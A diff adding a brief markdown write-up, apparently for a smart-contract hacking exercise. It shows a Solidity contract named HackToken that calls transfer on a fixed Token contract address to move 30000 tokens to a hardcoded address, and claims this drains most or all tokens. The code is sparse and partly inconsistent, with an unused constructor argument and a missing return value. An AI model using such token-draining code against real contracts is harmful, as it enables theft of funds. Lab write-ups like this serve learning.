@@ -1,0 +1,22 @@
+#How To
+
+Created a contract called HackToken.
+
+  contract HackToken{
+    
+    Token public instance = Token(0x1745788Bdb1c79F41F0F665ed3FEC837a6f46358);
+
+    constructor(uint _initialSupply) public {
+        _initialSupply = 500000;
+        // address owner = msg.sender;
+
+    }
+    function getToken() public returns(bool) {
+        instance.transfer(
+            0x283c158251f9f9e54894e5D1172D54EC840775Ba,
+            30000
+            );
+        }
+    }
+  
+With this, I am able to claim large or even all the token in the contract. 
